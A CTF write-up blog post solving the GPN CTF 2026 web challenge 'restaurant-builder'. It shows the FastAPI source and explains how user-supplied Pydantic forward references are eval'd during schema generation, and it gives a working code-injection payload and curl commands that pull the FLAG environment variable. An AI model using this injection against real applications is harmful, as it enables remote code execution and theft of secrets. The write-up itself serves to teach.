---
layout: post
title:  "Web Challenges"
date:   2026-06-08 14:36:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /GPN-CTF-2026-web/
---

**Title**: restaurant-builder

**Category**: Web

**Author**: uxxct

**Description**: So you want to build your own restaurant? Well, we obviously can't just let you do that. Please first submit blueprints and exact descriptions for the building, all the furniture and every single item you plan to have in the restaurant.

I download the challenge files. `Dockerfile`:
```shell
FROM scratch AS handout

COPY Dockerfile /handout/
COPY src/main.py src/pyproject.toml src/uv.lock /handout/src/

#-----------------------------------------

# docker build -t restaurant-builder .
# docker run --rm -p 1337:1337 -e FLAG="GPNCTF{this_is_a_dummy_flag}" restaurant-builder
# then connect to http://localhost:1337
FROM ghcr.io/astral-sh/uv:alpine AS challenge

COPY src/.python-version src/pyproject.toml src/uv.lock app/
WORKDIR /app
RUN uv sync

COPY src/ /app

EXPOSE 1337
ENTRYPOINT ["uv", "run", "gunicorn", "-k", "uvicorn.workers.UvicornWorker", "main:app", "--workers", "1", "--bind", "0.0.0.0:1337"]
```

`main.py`:
```python
from fastapi import FastAPI, Body, HTTPException
from pydantic import create_model
from typing import Dict

app = FastAPI()
blueprints = {}
items = {}

@app.get("/")
def home():
    return "The department of restaurant safety inspections thanks you for your cooperation."

@app.get("/blueprint/{name}")
def get_blueprint(name: str):
    blueprint = blueprints.get(name)
    if blueprint is None:
        return None
    return blueprint.model_json_schema()

@app.post("/blueprint/{name}")
def register_blueprint(name: str, description: Dict[str,str] = Body()):
    if name in blueprints:
        raise HTTPException(status_code=409, detail="We already know that one. But keep looking, I think there are some spoons missing.")

    description = {k: v for k,v in description.items() if not k.startswith("__")}
    Blueprint = create_model(name, **description)
    blueprints[name] = Blueprint

    return "Blueprint successfully registered"

@app.get("/item/{name}")
def get_item(name: str):
    return items.get(name)

@app.post("/item/{name}")
def register_item(name: str, item: str = Body()):
    if name not in blueprints:
        raise HTTPException(status_code=400, detail="That looks interesting but we don't know what it is. Are you sure it belongs in a kitchen?")
    try:
        items[name] = blueprints[name].model_validate_json(item, strict=True)
    except:
        raise HTTPException(status_code=409, detail="Are you sure you followed the blueprint exactly?")
    return "Item successfully registered"
```

The `description` dictionary contains user supplied data stored as strings. Pydantics `create_model` stores these strings as forward references. When the blueprints JSON schema is generated (via `model_json_schema()` in `GET /blueprint/{name}`), Pydantic evaluates those strings as Python code using `eval()`. They only filter keys starting with `"__"`. This allows arbitrary code injection.

payload:
```shell
{  
"x": "(blueprints.update({\"flag\": __import__(\"pydantic\").create_model(\"flag\", flag=(str, __import__(\"os\").environ[\"FLAG\"]))}), str)[1]"  
}
```

```shell
curl -X POST 'https://slow-roasted-fish-fingers-with-juiced-bread-qntl.gpn24.ctf.kitctf.de/blueprint/exploit' -H 'Content-Type: application/json' --data-raw '{"x": "(blueprints.update({\"flag\": __import__(\"pydantic\").create_model(\"flag\", flag=(str, __import__(\"os\").environ[\"FLAG\"]))}), str)[1]"}'  
"Blueprint successfully registered"
```

```shell
curl 'https://slow-roasted-fish-fingers-with-juiced-bread-qntl.gpn24.ctf.kitctf.de/blueprint/flag'  
{"properties":{"flag":{"default":"GPNCTF{anD_On3_or_7w0_rCeS_L4TER_thEY_8u1lT_H4PP1LY_3v3r_4FT3R}","title":"Flag","type":"string"}},"title":"flag","type":"object"}
```

`GPNCTF{anD_On3_or_7w0_rCeS_L4TER_thEY_8u1lT_H4PP1LY_3v3r_4FT3R}`
